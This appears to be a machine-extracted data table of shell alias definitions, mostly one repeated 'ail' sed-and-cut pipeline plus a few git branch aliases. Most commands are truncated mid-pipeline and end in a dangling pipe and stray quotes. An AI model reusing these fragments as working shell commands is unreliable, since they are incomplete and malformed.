3660293,584505,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660162,584502,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660126,584501,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660090,584500,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660054,584499,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660018,584498,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659982,584497,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659943,584493,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659907,584492,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659871,584491,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659835,584490,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659799,584489,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659763,584488,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659727,584487,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659691,584485,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659655,584484,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659619,584483,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659583,584482,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659452,584479,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659416,584478,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659380,584477,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659344,584476,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659308,584475,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659272,584474,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659236,584473,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659200,584472,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659164,584471,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659128,584470,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659092,584469,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659056,584468,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3659012,584459,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658976,584458,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658940,584457,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658904,584456,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658868,584455,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658832,584454,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658796,584453,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658760,584452,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658724,584451,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658688,584450,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658557,584447,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658521,584446,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658485,584445,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658449,584444,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658413,584443,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658282,584440,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658246,584439,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658210,584438,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658174,584437,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658138,584436,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658102,584435,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658066,584434,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3658030,584433,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657994,584432,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657958,584431,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657922,584430,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657886,584429,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657850,584428,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657814,584427,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657778,584426,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657742,584425,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657706,584424,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657670,584423,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657634,584422,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657598,584421,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657562,584420,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657526,584419,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657490,584418,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657454,584417,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657418,584416,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657286,584413,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657250,584412,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657214,584411,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657178,584410,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657142,584409,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657106,584408,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657070,584407,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3657034,584406,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656998,584405,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656962,584404,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656926,584403,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656890,584402,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656854,584401,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656818,584400,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656782,584399,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656746,584398,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656710,584397,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656674,584396,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656638,584395,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656602,584394,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656566,584393,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656530,584392,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656484,584389,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656448,584388,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656255,584385,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656219,584384,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656183,584383,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656129,584379,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656093,584378,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3656057,584376,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3655864,584373,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3655828,584371,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3655792,584370,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3655558,584366,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3655522,584365,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3655479,584362,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3655443,584361,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3655406,584359,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3655370,584358,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3655177,584355,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3655141,584354,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3655105,584353,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3655069,584352,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3655033,584351,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654997,584350,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654961,584349,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654925,584348,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654889,584347,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654822,584342,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654786,584340,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654750,584339,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654714,584338,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654678,584337,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654642,584336,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654606,584335,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654569,584333,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654523,584331,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654487,584329,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654451,584328,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654414,584326,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654378,584325,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654342,584322,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654230,584317,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654194,584316,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654158,584315,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654122,584314,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654086,584313,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654050,584312,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3654014,584311,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3653848,584305,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3653812,584304,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3653775,584302,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3653739,584301,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3653503,584292,gl,glg $(git show-ref | cut -d """" """" -f 2 | grep -v stash$)"""
3653483,584291,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3653447,584290,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3653367,584284,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3653331,584282,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3653295,584281,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3653102,584278,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3653066,584277,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3653030,584275,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3652946,584272,gcb,git branch | grep '\\*' | cut -c 3-"""
3650710,584059,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3648828,583957,gitbclean,git branch --merged master | grep -v """"\* master"""" | xargs -n 1 git branch -d"""
3644226,583751,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3643866,583732,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3643124,583700,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3643070,583698,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3642944,583691,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3642872,583687,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3642316,583660,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3642190,583654,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3641362,583611,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3641289,583607,git-$REPO_ID,\""""git --git-dir='$GITDIR_PATH' --work-tree='$WORKTREE_PATH'\"""""""" >> """"$ALIAS_FILE"""" || woanin_msg """"creating alias failed"""""""
3641144,583597,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3641108,583596,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3641071,583592,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3641034,583590,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640998,583589,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640961,583587,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640889,583584,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640853,583583,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640817,583581,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640781,583580,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640703,583575,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640662,583569,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640626,583567,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640590,583566,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640554,583565,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640518,583564,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640474,583555,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640438,583553,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640245,583550,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640209,583549,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640173,583548,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640133,583543,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640097,583542,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640061,583541,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3640025,583540,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639971,583537,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639935,583536,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639899,583535,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639863,583534,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639827,583533,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639791,583532,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639755,583531,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639719,583530,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639683,583529,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639647,583528,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639611,583527,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639575,583526,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639539,583525,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639503,583524,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639467,583523,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639431,583522,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639395,583521,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639359,583520,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639323,583519,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639287,583518,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639251,583517,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639215,583516,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639179,583515,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639143,583514,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639107,583513,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3639071,583512,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3638721,583507,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3638371,583501,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3638335,583500,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3638197,583497,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3638161,583496,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3638125,583495,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3638089,583494,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3638053,583493,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3638017,583492,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637981,583491,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637945,583490,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637909,583489,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637873,583488,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637837,583487,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637801,583486,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637765,583485,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637729,583484,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637693,583482,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637655,583480,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637619,583479,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637583,583478,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637547,583477,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637511,583476,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637475,583475,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637439,583474,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637403,583473,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637367,583472,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637331,583471,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637295,583470,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637259,583469,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637205,583467,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637169,583466,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637133,583465,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637097,583464,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637061,583463,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3637025,583462,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636989,583461,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636953,583460,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636917,583459,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636881,583458,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636845,583457,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636809,583456,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636773,583455,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636737,583454,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636701,583453,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636665,583452,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636629,583451,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636593,583450,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636557,583449,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636521,583448,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636485,583447,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636449,583446,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636413,583445,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636377,583444,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636341,583443,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636305,583442,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636269,583441,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636233,583440,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636197,583439,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636161,583438,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636125,583437,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636089,583436,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636053,583435,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3636017,583433,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635981,583432,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635945,583431,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635909,583430,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635873,583429,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635837,583428,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635801,583427,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635765,583426,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635729,583425,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635693,583424,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635657,583423,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635621,583422,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635585,583421,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
